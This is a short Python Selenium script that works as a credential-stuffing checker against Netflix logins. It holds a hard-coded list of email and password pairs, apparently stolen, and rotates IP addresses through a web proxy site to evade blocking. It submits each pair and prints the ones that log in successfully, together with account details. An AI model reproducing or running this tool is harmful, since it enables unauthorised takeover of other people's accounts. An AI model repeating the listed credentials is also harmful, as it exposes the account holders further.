from selenium import webdriver
from time import sleep
from selenium.webdriver.common.by import By

x = {
    'cpierce64987@tn.com ': 'hellfire2291',
    'philipdavis501@tn.com ': 'March0314'}


def nextIP(ipN):
    if ipN >= 12:
        return 2
    else:
        return ipN + 1


def changeIP(ipN):
    driver.get('https://www.newipnow.com/')
    urlbox = driver.find_element_by_xpath('//*[@id="promo-form"]/table/tbody/tr[1]/td[3]/input')
    urlbox.clear()
    urlbox.send_keys("https://www.netflix.com/login")
    openNetflix = driver.find_element_by_id(f"prox_{ipN}")
    openNetflix.click()
    return nextIP(ipN)


driver = webdriver.Chrome("C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")
driver.maximize_window()
ipNo = 11
ipNo = changeIP(ipNo)
limit = 0

for e, p in x.items():
    email_b = driver.find_element_by_id('id_userLoginId')
    pass_b = driver.find_element_by_id('id_password')
    email_b.clear()
    email_b.send_keys(e)
    pass_b.send_keys(p)
    email_b.submit()
    print(e, p, ipNo)
    try:
        driver.find_element_by_xpath(
            '//*[@id="appMountPoint"]/div/div/div/div/div/div[2]/div[6]/div[1]/div[2]/ul/li[3]/a').click()
        a = driver.find_element_by_xpath(
            '//*[@id="appMountPoint"]/div/div/div[2]/div/div/div[2]/div[2]/section/div/div/div[1]/div')
        print("logged in:", e, p, a.text)
        driver.get('https://www.newipnow.com/')
        urlbox = driver.find_element_by_xpath('//*[@id="promo-form"]/table/tbody/tr[1]/td[3]/input')
        urlbox.clear()
        urlbox.send_keys("https://www.netflix.com/login")
        ipNo = nextIP(ipNo)
        openNetflix = driver.find_element_by_id(f"prox_{ipNo}")
        openNetflix.click()
    except:
        limit = limit + 1
        if limit % 5 == 0:
            ipNo = changeIP(ipNo)